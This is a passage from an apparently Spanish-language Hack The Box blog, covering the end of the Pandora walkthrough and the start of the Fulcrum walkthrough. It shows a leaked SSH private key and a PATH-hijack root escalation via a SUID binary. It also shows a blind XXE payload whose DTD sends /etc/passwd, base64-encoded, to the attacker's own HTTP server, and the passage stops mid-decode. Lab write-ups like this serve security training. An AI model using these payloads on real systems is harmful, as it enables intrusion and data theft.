5UoyZdlSAv2/YcpDcmXIxd40CXqzUB2C+Ucs9fZ3VPqFkVARE6788I1Q+vYUFDbvUIv8S6
+xbwWS7C7us5y+Z52be9jFmSNbt2wjwNNmFsBKbPURb9WVEzQ8x5RiqlwPITI8ZrPELHnV
EQZWA6D3o63179RQ4U4OO4fZJ9Xb7wAAAAMBAAEAAAGBAJ+CoNMyThowXz01gHfI1UZmmf
AaUR2QWrZDQjhAEfus7Ka5hNoJ0dkcIsjJMU+Kqcpvoq/7v2LT1cD5AQYcEX1AGFEXpC0B
OHMGa4I/V/UsUUzEYf5lPB+UE8dxDcx+SsfM1MnHEs8zFxSW1DGFYr+o/ilfOWjHoqDYSN
G9pFcslTxetOb56qWPT7JWrPiGRuo7XOIikQFY3xCGFU0NvEP0rsB5VGM3ei0YRdh+Hzrm
UFq0ySIQbm+0D/OKgBwM1zrDWEcyjBQC7qXknSwSSL4G9oV7zldSmgPGuRt9MIu6AV26gL
IuXhZ/Gp/879ycyIvcZrQ5jYHtbKock7/ypblHsqhtEg1WiD2fISLWnYiKYCTqvaBX2Z/7
sOzqmBlNgUzgvgqiE4E1uS1RgbqJEj8BRv+jn6A/0KPfUMN+tmzKJ4ruyIqnVhb0BG0vl0
eHixP4CH6saAZvz8rWJmBZk8ZCq0GkTQxkgvAZvKk+7T8xIdMh3CIXBqwS15yWX5EtYQAA
AMB3basjLgKOqzyQR5HiavL8xwRpnSEpTl/kLW0axO2YwiJuPYO0rpQWbuIt5Uywi9TVte
UCz9KcVQ59NPcSNVAH8eQhcDE2WOs9dL5KrUpZ5qTXyPaNgKTtGzmI9GT3/uG6KTkgIl24
UEk3phxF5odO6zlPx0ir9o26zVnP+jYNztrdyCFhZdK5kG6EgxJ25bg113MG6a1/y5fAg+
G48rg+UnT6F9vwQgcDJCuFZXbQWm46LpnOvghe3hSVS6cp9JoAAADBANVgf1cYaLntTxCG
z+h90vqvZd2VkovX+ALj3Zi1nh2z1Glpwwh6NQ3Rw6yJt/CHBSHFOGa/Ku24oydivmVTRW
BeucHYMx5WBi1A90viLRAXH5sV+yglg/c1Lo7nRcnScBgatBnX/o9CZKQVyTYPBXnCSBI+
QBCQ618KwMUgBnZi0b02FsMFueUB54s3OE2LjhjNJKcIlB1ff9z8Gzr/aT1pgA/VOX7FrY
XV0V2LIobFf2IS/8WBVpiBwplxdNt7BwAAAMEAwRpPlNZJoA+1FBtxlltoggDf+iZHeQLX
8qsRZ8F8AGXae/GDLxRzUSyZybN4z2I8FFn7rWCd2P/IZ4xSrst9lakDbm8kMUw66n6QEm
5rDuOqEIde2c3q9P2YPBnvAJBjV4DWl7IV+GE/HGOdOf95LLzhwC6qJiIcaojgZUbURGXE
2thcx0xqNir5SH+atl7EvYSYlRaafAoBYHvcn2OJpNJR6sI++vwmQFdUhZCnU9OvD0J5e2
<span class="nv">8HBQDVmx0N9RXZAAAADG1hdHRAcGFuZG9yYQECAwQFBg</span><span class="o">==</span>
<span class="nt">-----END</span> OPENSSH PRIVATE KEY-----
</code></pre></div></div>

<ul>
  <li>Y podemos conectarnos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  content nano id_rsa
‚ûú  content <span class="nb">chmod </span>600 id_rsa
‚ûú  content ssh <span class="nt">-i</span> id_rsa matt@10.10.11.136
Welcome to Ubuntu 20.04.3 LTS <span class="o">(</span>GNU/Linux 5.4.0-91-generic x86_64<span class="o">)</span>

 <span class="k">*</span> Documentation:  https://help.ubuntu.com
 <span class="k">*</span> Management:     https://landscape.canonical.com
 <span class="k">*</span> Support:        https://ubuntu.com/advantage

  System information as of Wed 19 Jun 21:08:19 UTC 2024

  System load:           0.0
  Usage of /:            63.6% of 4.87GB
  Memory usage:          15%
  Swap usage:            0%
  Processes:             242
  Users logged <span class="k">in</span>:       1
  IPv4 address <span class="k">for </span>eth0: 10.10.11.136
  IPv6 address <span class="k">for </span>eth0: dead:beef::250:56ff:feb0:def7

  <span class="o">=&gt;</span> /boot is using 91.8% of 219MB


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check <span class="k">for </span>new updates run: <span class="nb">sudo </span>apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings



The programs included with the Ubuntu system are free software<span class="p">;</span>
the exact distribution terms <span class="k">for </span>each program are described <span class="k">in </span>the
individual files <span class="k">in</span> /usr/share/doc/<span class="k">*</span>/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

matt@pandora:~<span class="nv">$ </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
</code></pre></div></div>

<ul>
  <li>Vamos a ejecutar el <code class="language-plaintext highlighter-rouge">pandora_backup</code> que vimos anteriormente para ver que pasa.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>matt@pandora:~<span class="nv">$ </span>pandora_backup
<span class="o">[</span><span class="nt">--------------------------------------------------------------------------------------</span><span class="o">]</span>
Backup successful!
Terminating program!
</code></pre></div></div>

<ul>
  <li>Como vimos el propietario es <code class="language-plaintext highlighter-rouge">root</code> y es <code class="language-plaintext highlighter-rouge">SUID</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>matt@pandora:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> /usr/bin/pandora_backup
<span class="nt">-rwsr-x---</span> 1 root matt 16816 Dec  3  2021 /usr/bin/pandora_backup
</code></pre></div></div>

<ul>
  <li>Es un binario.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>matt@pandora:~<span class="nv">$ </span>file /usr/bin/pandora_backup
/usr/bin/pandora_backup: setuid ELF 64-bit LSB shared object, x86-64, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]<span class="o">=</span>7174c3b04737ad11254839c20c8dab66fce55af8, <span class="k">for </span>GNU/Linux 3.2.0, not stripped
</code></pre></div></div>

<ul>
  <li>Vemos que se esta usando <code class="language-plaintext highlighter-rouge">tar</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>matt@pandora:~<span class="nv">$ </span>ltrace /usr/bin/pandora_backup
getuid<span class="o">()</span>                                                                                  <span class="o">=</span> 1000
geteuid<span class="o">()</span>                                                                                 <span class="o">=</span> 1000
setreuid<span class="o">(</span>1000, 1000<span class="o">)</span>                                                                      <span class="o">=</span> 0
puts<span class="o">(</span><span class="s2">"PandoraFMS Backup Utility"</span>PandoraFMS Backup Utility
<span class="o">)</span>                                                         <span class="o">=</span> 26
puts<span class="o">(</span><span class="s2">"Now attempting to backup Pandora"</span>...Now attempting to backup PandoraFMS client
<span class="o">)</span>                                               <span class="o">=</span> 43
system<span class="o">(</span><span class="s2">"tar -cvf /root/.backup/pandora-b"</span>...tar: /root/.backup/pandora-backup.tar.gz: Cannot open: Permission denied
<span class="nb">tar</span>: Error is not recoverable: exiting now
 &lt;no <span class="k">return</span> ...&gt;
<span class="nt">---</span> SIGCHLD <span class="o">(</span>Child exited<span class="o">)</span> <span class="nt">---</span>
&lt;... system resumed&gt; <span class="o">)</span>                                                                    <span class="o">=</span> 512
puts<span class="o">(</span><span class="s2">"Backup failed!</span><span class="se">\n</span><span class="s2">Check your permis"</span>...Backup failed!
Check your permissions!
<span class="o">)</span>                                              <span class="o">=</span> 39
+++ exited <span class="o">(</span>status 1<span class="o">)</span> +++
</code></pre></div></div>

<ul>
  <li>
    <p>Bueno pues como a nivel de sistema se esta ejecutando <code class="language-plaintext highlighter-rouge">tar</code> podemos hacer un <code class="language-plaintext highlighter-rouge">PATH Hijacking</code> ya que se esta haciendo de forma relativa y deber√≠a ser absoluta para evitarlo.</p>
  </li>
  <li>
    <p>Tendr√≠a que usarse de esta forma.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>matt@pandora:~<span class="nv">$ </span>which <span class="nb">tar</span>
/usr/bin/tar
</code></pre></div></div>

<ul>
  <li>Este es el PATH.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>matt@pandora:~<span class="nv">$ </span><span class="nb">echo</span> <span class="nv">$PATH</span>
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
</code></pre></div></div>

<ul>
  <li>Lo que vamos a hacer es que nos de una <code class="language-plaintext highlighter-rouge">Bash</code> como <code class="language-plaintext highlighter-rouge">root</code> ya que <code class="language-plaintext highlighter-rouge">root</code> es la persona que esta ejecutando el binario al crearnos un archivo llamado <code class="language-plaintext highlighter-rouge">tar</code> le vamos a decir que el <code class="language-plaintext highlighter-rouge">PATH</code> comience desde donde nosotros le indiquemos que es en esta ruta para que tome nuestro <code class="language-plaintext highlighter-rouge">tar</code> y no el <code class="language-plaintext highlighter-rouge">/usr/bin/tar</code> que esa es su ruta absoluta pero aprovech√°ndonos de que en el binario no se esta haciendo de manera correcta la llamada a <code class="language-plaintext highlighter-rouge">/usr/bin/tar</code> es por eso que podemos alterar esto.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>matt@pandora:~<span class="nv">$ </span><span class="nb">cd</span> /tmp
matt@pandora:/tmp<span class="nv">$ </span><span class="nb">touch tar
</span>matt@pandora:/tmp<span class="nv">$ </span><span class="nb">chmod</span> +x <span class="nb">tar
</span>matt@pandora:/tmp<span class="nv">$ </span>nano <span class="nb">tar
</span>matt@pandora:/tmp<span class="nv">$ </span><span class="nb">cat tar</span>
/usr/bin/sh
</code></pre></div></div>

<ul>
  <li>Ahora el <code class="language-plaintext highlighter-rouge">PATH</code> comienza en <code class="language-plaintext highlighter-rouge">tmp</code> y como va buscar el <code class="language-plaintext highlighter-rouge">tar</code> y el <code class="language-plaintext highlighter-rouge">tar</code> lo tenemos en <code class="language-plaintext highlighter-rouge">tmp</code> pues como all√≠ lo va a encontrar va a ejecutar el de nosotros y no va a llegar ala ruta donde si esta el <code class="language-plaintext highlighter-rouge">tar</code> correcto gracias a esto ejecutara la instrucci√≥n que indicamos que es darnos una sh.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>matt@pandora:/tmp<span class="nv">$ </span><span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>/tmp:<span class="nv">$PATH</span>
matt@pandora:/tmp<span class="nv">$ </span><span class="nb">echo</span> <span class="nv">$PATH</span>
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
</code></pre></div></div>

<h2 id="shell-as-root">Shell as root</h2>

<ul>
  <li>Ahora si lo ejecutamos vamos a obtener una <code class="language-plaintext highlighter-rouge">shell</code> como el usuario <code class="language-plaintext highlighter-rouge">root</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>matt@pandora:/tmp<span class="nv">$ </span>pandora_backup
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
<span class="c"># whoami</span>
root
<span class="c"># bash</span>
root@pandora:/tmp# <span class="nb">cat</span> /root/root.txt
774d751ca4a7eabaed28a386f20a26c2
</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/easy" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HackTheBox - Fulcrum (insane)</title><link href="http://localhost:4000/hackthebox/machines/insane/2024/06/15/fulcrum.html" rel="alternate" type="text/html" title="HackTheBox - Fulcrum (insane)" /><published>2024-06-15T00:00:00-06:00</published><updated>2024-06-15T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/insane/2024/06/15/fulcrum</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/insane/2024/06/15/fulcrum.html"><![CDATA[<p align="center">
<img src="https://labs.hackthebox.com/storage/avatars/31252a37873dc31f600f40de91dd52d6.png" />
</p>

<ul>
  <li>Fulcrum is one of the most challenging machines on Hack The Box. It requires multiple pivots between Linux and Windows, and focuses heavily on the use of PowerShell.</li>
</ul>

<h2 id="portscan">PortScan</h2>

<ul>
  <li>Comenzamos escaneando los puertos abiertos y servicios de la m√°quina victima.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  nmap <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p4</span>,22,80,88,9999,56423 10.10.10.62 <span class="nt">-oN</span> targeted
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-06-14 12:29 CST
Nmap scan report <span class="k">for </span>10.10.10.62
Host is up <span class="o">(</span>0.12s latency<span class="o">)</span><span class="nb">.</span>

PORT      STATE SERVICE VERSION
4/tcp     open  http    nginx 1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Site doesn<span class="s1">'t have a title (text/html; charset=UTF-8).
|_http-server-header: nginx/1.18.0 (Ubuntu)
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp    open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Input string was not in a correct format.
88/tcp    open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: phpMyAdmin
| http-robots.txt: 1 disallowed entry
|_/
9999/tcp  open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Input string was not in a correct format.
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods:
|_  Potentially risky methods: TRACE
56423/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: Fulcrum-API Beta
|_http-title: Site doesn'</span>t have a title <span class="o">(</span>application/json<span class="p">;</span><span class="nv">charset</span><span class="o">=</span>utf-8<span class="o">)</span><span class="nb">.</span>
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</code></pre></div></div>

<h2 id="enumeraci√≥n">Enumeraci√≥n</h2>

<ul>
  <li>
    <p>Tenemos puertos abiertos que corren el servicio <code class="language-plaintext highlighter-rouge">http</code> y uno <code class="language-plaintext highlighter-rouge">ssh</code>.</p>
  </li>
  <li>
    <p>Vamos a ver lo que hay en cada servicio.</p>
  </li>
  <li>
    <p>En el puerto <strong>80</strong> vemos lo siguiente.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/fulcrum/1.png" />
</p>

<ul>
  <li>En el puerto <strong>88</strong> vemos el panel t√≠pico de <code class="language-plaintext highlighter-rouge">phpMyAdmin</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/fulcrum/2.png" />
</p>

<ul>
  <li>El puerto <strong>9999</strong> vemos lo mismo que en el puerto <strong>80</strong>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/fulcrum/3.png" />
</p>

<ul>
  <li>Vemos esto en el puerto <strong>4</strong>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/fulcrum/4.png" />
</p>

<ul>
  <li>Si le damos <code class="language-plaintext highlighter-rouge">click</code> en try again vemos que la <code class="language-plaintext highlighter-rouge">url</code> es interesante.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/fulcrum/5.png" />
</p>

<ul>
  <li>Hay otro puerto abierto el cual nos muestra data en formato <code class="language-plaintext highlighter-rouge">JSON</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/fulcrum/6.png" />
</p>

<ul>
  <li>Algo que podemos hacer es modificar la data con <code class="language-plaintext highlighter-rouge">BurpSuite</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/fulcrum/7.png" />
</p>

<ul>
  <li>Si enviamos data vemos que es lo mismo no cambia.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/fulcrum/8.png" />
</p>

<ul>
  <li>
    <p>Algo que podemos hacer es pasarle una estructura en <code class="language-plaintext highlighter-rouge">xml</code>.</p>
  </li>
  <li>
    <p>Vemos que ahora si cambia.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/fulcrum/9.png" />
</p>

<h2 id="shell-as-www-data">Shell as www-data</h2>

<ul>
  <li>
    <p>Vamos a probar un XXE <a href="https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity">https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity</a>, <a href="https://portswigger.net/web-security/xxe">https://portswigger.net/web-security/xxe</a>.</p>
  </li>
  <li>
    <p>Declaramos una entidad que se llama <code class="language-plaintext highlighter-rouge">xxe</code> que usa un <code class="language-plaintext highlighter-rouge">wrapper</code> de tipo file que carga el <code class="language-plaintext highlighter-rouge">/etc/passwd</code> de la m√°quina.</p>
  </li>
  <li>
    <p>Pero no nos reporta nada.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/fulcrum/10.png" />
</p>

<ul>
  <li>Podemos cambiar las etiquetas a las nuestras para ver si cambia algo.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/fulcrum/11.png" />
</p>

<ul>
  <li>Puede que sea a ciegas por que no nos reporta nada pero podemos probar si recibimos una petici√≥n a un servidor nuestro.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  nmap python3 <span class="nt">-m</span> http.server 80
Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
</code></pre></div></div>

<ul>
  <li>Ahora vemos que si funciona.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/fulcrum/12.png" />
</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  nmap python3 <span class="nt">-m</span> http.server 80
Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
10.10.10.62 - - <span class="o">[</span>14/Jun/2024 13:29:25] code 404, message File not found
10.10.10.62 - - <span class="o">[</span>14/Jun/2024 13:29:25] <span class="s2">"GET /test HTTP/1.0"</span> 404 -
</code></pre></div></div>

<ul>
  <li>
    <p>Sabiendo esto podemos probar lo siguiente <a href="https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity#blind-ssrf-exfiltrate-data-out-of-band">https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity#blind-ssrf-exfiltrate-data-out-of-band</a>.</p>
  </li>
  <li>
    <p>Necesitamos par√°metros en este caso vamos a crear <code class="language-plaintext highlighter-rouge">%param1</code>.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/fulcrum/13.png" />
</p>

<ul>
  <li>
    <p>Vamos a crear el <code class="language-plaintext highlighter-rouge">xml</code> <a href="https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity#malicious-dtd-example">https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity#malicious-dtd-example</a>.</p>
  </li>
  <li>
    <p>Vamos a cargar en <code class="language-plaintext highlighter-rouge">base64</code> el <code class="language-plaintext highlighter-rouge">/etc/passwd</code> de la maquina.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  nmap <span class="nb">cat </span>zi.xml
&lt;<span class="o">!</span>ENTITY % file SYSTEM <span class="s2">"php://filter/convert.base64-encode/resource=/etc/passwd"</span><span class="o">&gt;</span>
&lt;<span class="o">!</span>ENTITY % param1 <span class="s2">"&lt;!ENTITY filename SYSTEM 'http://10.10.14.62/%file;'&gt;"</span><span class="o">&gt;</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  nmap python3 <span class="nt">-m</span> http.server 80
Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
</code></pre></div></div>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/fulcrum/14.png" />
</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  nmap python3 <span class="nt">-m</span> http.server 80
Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
10.10.10.62 - - <span class="o">[</span>14/Jun/2024 13:45:07] <span class="s2">"GET /zi.xml HTTP/1.0"</span> 200 -
10.10.10.62 - - <span class="o">[</span>14/Jun/2024 13:45:07] code 404, message File not found
10.10.10.62 - - <span class="o">[</span>14/Jun/2024 13:45:07] <span class="s2">"GET /cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMDoxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMToxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4Kc3lzdGVtZC10aW1lc3luYzp4OjEwMjoxMDQ6c3lzdGVtZCBUaW1lIFN5bmNocm9uaXphdGlvbiwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDY6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzeXNsb2c6eDoxMDQ6MTEwOjovaG9tZS9zeXNsb2c6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjEwNTo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnRzczp4OjEwNjoxMTE6VFBNIHNvZnR3YXJlIHN0YWNrLCwsOi92YXIvbGliL3RwbTovYmluL2ZhbHNlCnV1aWRkOng6MTA3OjExMjo6L3J1bi91dWlkZDovdXNyL3NiaW4vbm9sb2dpbgp0Y3BkdW1wOng6MTA4OjExMzo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCmxhbmRzY2FwZTp4OjEwOToxMTU6Oi92YXIvbGliL2xhbmRzY2FwZTovdXNyL3NiaW4vbm9sb2dpbgpwb2xsaW5hdGU6eDoxMTA6MTo6L3Zhci9jYWNoZS9wb2xsaW5hdGU6L2Jpbi9mYWxzZQpzc2hkOng6MTExOjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4Kc3lzdGVtZC1jb3JlZHVtcDp4Ojk5OTo5OTk6c3lzdGVtZCBDb3JlIER1bXBlcjovOi91c3Ivc2Jpbi9ub2xvZ2luCmx4ZDp4Ojk5ODoxMDA6Oi92YXIvc25hcC9seGQvY29tbW9uL2x4ZDovYmluL2ZhbHNlCnVzYm11eDp4OjExMjo0Njp1c2JtdXggZGFlbW9uLCwsOi92YXIvbGliL3VzYm11eDovdXNyL3NiaW4vbm9sb2dpbgpkbnNtYXNxOng6MTEzOjY1NTM0OmRuc21hc3EsLCw6L3Zhci9saWIvbWlzYzovdXNyL3NiaW4vbm9sb2dpbgpsaWJ2aXJ0LXFlbXU6eDo2NDA1NToxMDg6TGlidmlydCBRZW11LCwsOi92YXIvbGliL2xpYnZpcnQ6L3Vzci9zYmluL25vbG9naW4KbGlidmlydC1kbnNtYXNxOng6MTE0OjEyMDpMaWJ2aXJ0IERuc21hc3EsLCw6L3Zhci9saWIvbGlidmlydC9kbnNtYXNxOi91c3Ivc2Jpbi9ub2xvZ2luCg== HTTP/1.0"</span> 404 -
</code></pre></div></div>

<ul>
  <li>Funciona.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  nmap <span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMDoxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMToxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4Kc3lzdGVtZC10aW1lc3luYzp4OjEwMjoxMDQ6c3lzdGVtZCBUaW1lIFN5bmNocm9uaXphdGlvbiwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDY6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzeXNsb2c6eDoxMDQ6MTEwOjovaG9tZS9zeXNsb2c6L3Vzci9zYmluL25vbG9naW4KX2Fwd